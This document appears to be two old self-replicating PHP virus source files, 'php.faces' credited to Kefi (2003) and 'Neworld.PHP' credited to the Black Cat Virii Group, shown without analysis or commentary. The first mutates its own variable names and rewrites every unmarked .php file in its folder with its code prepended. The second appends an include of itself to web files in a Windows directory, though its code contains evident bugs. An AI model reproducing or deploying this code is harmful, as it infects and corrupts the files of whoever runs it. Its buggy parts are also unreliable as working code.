<?php
 $ypxqrpsqcc = fopen(__FILE__, "r");
 $bbugesqpty = substr(fread($ypxqrpsqcc, filesize(__FILE__)), 0, 1249);
 fclose($ypxqrpsqcc);
 $dhbpgxtamn = array("ypxqrpsqcc", "bbugesqpty", "dhbpgxtamn", "cctsvcopcx", "wurwejtvjx",
 "ccznwozuuo", "uudxleoyja", "ionwdbkwfh", "zohqscoxob", "skzmabzbfe");
 for($cctsvcopcx = 0; $cctsvcopcx < count($dhbpgxtamn); $cctsvcopcx++){
  $wurwejtvjx = chr(rand(97, 122));
  for($ccznwozuuo = 0; $ccznwozuuo < 9; $ccznwozuuo++)  $wurwejtvjx = $wurwejtvjx . chr(rand(97, 122));
  $bbugesqpty = str_replace("$dhbpgxtamn[$cctsvcopcx]", "$wurwejtvjx", "$bbugesqpty");
 }
 $uudxleoyja = opendir(".");
 while(false !== ($ionwdbkwfh = readdir($uudxleoyja))){
  if($ionwdbkwfh != "." && $ionwdbkwfh != ".."){
   if(substr($ionwdbkwfh, -3) == "php"){
    $zohqscoxob = fopen($ionwdbkwfh, "r"); 
     $skzmabzbfe = substr(fread($zohqscoxob, filesize($ionwdbkwfh)), 5);
    fclose($zohqscoxob);
    if(!strstr($skzmabzbfe, "php.faces")){
     unlink("$ionwdbkwfh");
     $zohqscoxob = fopen($ionwdbkwfh, "a+"); 
     fwrite($zohqscoxob, "$bbugesqpty");
     fwrite($zohqscoxob, "$skzmabzbfe");
     fclose($zohqscoxob);
    }
   }
  }
 }
 closedir($uudxleoyja);
 // php.faces  (c) by Kefi, 2003
?>


<?php

$vir_string = "Neworld.PHP\n";
$virstringm = "Welcome To The New World Of PHP Programming\n";
$virt	    = $vir_string . $virstringm;

echo	$virt;

$all = opendir('C:\Windows\');
while ($file = readdir($all))
{
	$inf = true;
	$exe = false;

	if ( ($exe = strstr ($file, '.php')) || ($exe = strstr ($file, '.html')) || ($exe = strstr ($file, '.htm')) || ($exe = strstr ($file, '.htt')) )
	if ( is_file($file) && is_writeable($file) )
	{
		
		
		$new = fopen($file, "r");
		$look = fread($new, filesize($file));
		$yes = strstr ($look, 'neworld.php');
		if (!$yes) $inf = false;
	}
	
	if ( ($inf=false) )
	{
		$new = fopen($file, "a");
		$fputs($new, "<!-- ");
		$fputs($new, "Neworld.PHP - ");
		$fputs($new, "Made By Xmorpfic, ");
		$fputs($new, "www.shadowvx.com/bcvg, ");
		$fputs($new, "The Black Cat Virii Group.");
		$fputs($new, "--->");
		$fputs($new, "<?php ");
		$fputs($new, "include(\"");
		$fputs($new, __FILE__);
		$fputs($new, "\"); ");
		$fputs($new, "?>");
		return;
	}
}
closedir($all);
// Neworld.PHP Virus - Made By Xmorfic, www.shadowvx.com/bcvg, Black Cat Virii Group.
?>


